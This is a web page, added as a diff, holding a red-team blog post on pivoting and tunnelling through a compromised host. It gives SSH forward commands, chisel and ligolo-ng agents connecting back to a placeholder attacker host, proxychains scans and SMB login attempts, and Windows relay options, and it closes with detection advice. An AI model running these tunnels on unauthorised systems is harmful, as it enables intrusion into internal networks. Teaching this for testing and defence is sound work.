@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pivoting &amp; Tunnelling — Satej Chaudhari</title>
+  <meta name="description" content="Using a foothold to reach networks you cannot touch directly — the local/remote/dynamic forwards and SOCKS, SSH tunnelling, chisel, ligolo-ng&#x27;s routable interface, proxychains, Windows pivots (netsh portproxy, C2 SOCKS), double pivots, and detection.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Satej Chaudhari">
+  <meta property="og:title" content="Pivoting &amp; Tunnelling">
+  <meta property="og:description" content="Using a foothold to reach networks you cannot touch directly — the local/remote/dynamic forwards and SOCKS, SSH tunnelling, chisel, ligolo-ng&#x27;s routable interface, proxychains, Windows pivots (netsh portproxy, C2 SOCKS), double pivots, and detection.">
+  <meta property="og:url" content="https://satejchaudhari.com/theory/2026-10-09-pivoting-and-tunnelling.html">
+  <meta property="og:image" content="https://satejchaudhari.com/assets/img/og-default.png">
+  <meta property="article:published_time" content="2026-10-09">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Pivoting &amp; Tunnelling">
+  <meta name="twitter:description" content="Using a foothold to reach networks you cannot touch directly — the local/remote/dynamic forwards and SOCKS, SSH tunnelling, chisel, ligolo-ng&#x27;s routable interface, proxychains, Windows pivots (netsh portproxy, C2 SOCKS), double pivots, and detection.">
+  <meta name="twitter:image" content="https://satejchaudhari.com/assets/img/og-default.png">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+
+  <a class="skip-link" href="#main">Skip to main content</a>
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../theory.html" aria-current="page">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../writeups.html">Writeups</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main id="main" tabindex="-1" class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">Red Team</span>
+        <h1 class="post-title">Pivoting &amp; Tunnelling</h1>
+        <p class="post-meta">
+          <time datetime="2026-10-09">2026-10-09</time>
+          <span>&middot; 10 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p>
+          A foothold rarely sits where the objective is. Pivoting is using that
+          first host as a relay to reach networks and services you cannot touch
+          directly; tunnelling is the plumbing that carries your tools' traffic
+          through it. Get this right and a single beachhead becomes a route into
+          every segment it can see.
+        </p>
+
+        <h2>The three forwards, and SOCKS</h2>
+        <p>
+          Every tunnelling tool is a variation on four primitives:
+        </p>
+        <table>
+          <thead><tr><th>Primitive</th><th>What it does</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Local forward</strong></td><td>A port on <em>your</em> box forwards to a host:port reachable from the pivot (reach one remote service)</td></tr>
+            <tr><td><strong>Remote forward</strong></td><td>A port on the <em>pivot</em> forwards back to you (expose your listener to the internal net — e.g. for a reverse shell)</td></tr>
+            <tr><td><strong>Dynamic forward (SOCKS)</strong></td><td>A SOCKS proxy on your box; any tool can reach <em>any</em> host the pivot can — the workhorse</td></tr>
+            <tr><td><strong>Relay / agent</strong></td><td>A purpose-built tunnel (chisel, ligolo) that gives you a SOCKS proxy or even a routable interface over one outbound connection</td></tr>
+          </tbody>
+        </table>
+
+        <h2>SSH tunnelling</h2>
+        <p>
+          When you have SSH access to or from the pivot, you need no extra tools.
+        </p>
+        <pre><code># dynamic (SOCKS) — then point tools through it (see proxychains)
+ssh -D 1080 user@pivot
+# local forward — reach an internal DB through the pivot
+ssh -L 9000:10.10.20.5:5432 user@pivot
+# remote forward — expose your local 4444 on the pivot for a reverse shell
+ssh -R 4444:127.0.0.1:4444 user@pivot
+# chain through two pivots with ProxyJump
+ssh -J user@pivot1 user@pivot2</code></pre>
+
+        <h2>chisel — TCP/UDP tunnel over HTTP</h2>
+        <p>
+          When SSH is not available, <strong>chisel</strong> builds a tunnel over a
+          single HTTP(S) connection — ideal through restrictive egress. Run a server
+          on your box and a client on the pivot (or vice versa) to get a reverse
+          SOCKS proxy.
+        </p>
+        <pre><code># on your box (attacker): listen, accept a reverse tunnel
+chisel server -p 8080 --reverse
+# on the pivot: connect back and expose a SOCKS proxy on your 1080
+chisel client <attacker>:8080 R:1080:socks</code></pre>
+
+        <h2>ligolo-ng — a routable interface</h2>
+        <p>
+          <strong>ligolo-ng</strong> is the modern favourite: instead of a SOCKS
+          proxy you get a real <code>tun</code> interface, so every tool works
+          natively with no proxychains and full ICMP/UDP. You add a route for the
+          internal subnet and the agent on the pivot relays it.
+        </p>
+        <pre><code># attacker: start the proxy + tun interface
+./proxy -selfcert
+# pivot: run the agent connecting back
+./agent -connect <attacker>:11601
+# in the ligolo console: start the tunnel, then add a route to the internal net
+# (your OS routing sends 10.10.20.0/24 down the tun -> the pivot relays it)</code></pre>
+
+        <h2>proxychains — push existing tools through a SOCKS proxy</h2>
+        <p>
+          With a SOCKS proxy up (SSH <code>-D</code>, chisel, a C2 socks module),
+          <code>proxychains</code> forces any dynamically-linked tool through it.
+        </p>
+        <pre><code># /etc/proxychains4.conf -> socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn -p 445,3389 10.10.20.0/24
+proxychains nxc smb 10.10.20.5 -u user -p pass
+# note: proxychains is TCP-only and no ICMP -> use -sT and skip host discovery</code></pre>
+
+        <h2>Windows pivots</h2>
+        <ul>
+          <li><strong>netsh portproxy</strong> — a built-in local/remote forward on Windows (<code>netsh interface portproxy add v4tov4 ...</code>), survives as a quiet native relay.</li>
+          <li><strong>C2 SOCKS</strong> — most frameworks expose a SOCKS proxy over the beacon (Sliver/CS), so you tunnel the whole toolset through the implant with no extra binary on disk.</li>
+          <li><strong>SSH on Windows</strong> — the built-in OpenSSH client supports the same <code>-L/-R/-D</code> forwards.</li>
+        </ul>
+
+        <h2>Double pivots &amp; hygiene</h2>
+        <p>
+          To reach a third network, chain: pivot A gives you a SOCKS to network B;
+          an agent on a host in B gives you a SOCKS to network C (ligolo and chisel
+          both support stacking). Keep each hop labelled, tear tunnels down when
+          done, and remember that every relay you leave running is both an IOC and a
+          dependency your session rests on.
+        </p>
+
+        <h2>Detection</h2>
+        <ul>
+          <li>Long-lived outbound connections from a server that should not initiate them, and internal hosts talking to each other on unusual ports.</li>
+          <li>chisel/ligolo binaries on disk or in memory; <code>netsh portproxy</code> entries; unexpected <code>tun</code> interfaces.</li>
+          <li>SOCKS-shaped traffic and port-scan fan-out <em>from</em> an internal host — a pivot scanning its neighbours.</li>
+          <li>Egress controls and east-west segmentation (see <a href="2026-10-02-network-segmentation.html">Network Segmentation</a>) are what blunt pivoting in the first place.</li>
+        </ul>
+
+        <h2>Related reading</h2>
+        <ul class="related-list">
+          <li><a href="2026-10-09-linux-privilege-escalation.html">Linux Privilege Escalation</a></li>
+          <li><a href="2026-10-02-network-segmentation.html">Network Segmentation &amp; Micro-segmentation</a></li>
+          <li><a href="2026-09-23-command-and-control.html">Command &amp; Control (C2) Frameworks</a></li>
+          <li><a href="../ad-map.html">AD Attack-Path Explorer</a></li>
+        </ul>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../theory.html">Theory</a>
+<a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+
+  <script src="../assets/js/main.js"></script>
+  <script src="../assets/js/post-enhance.js"></script>
+</body>
+</html>
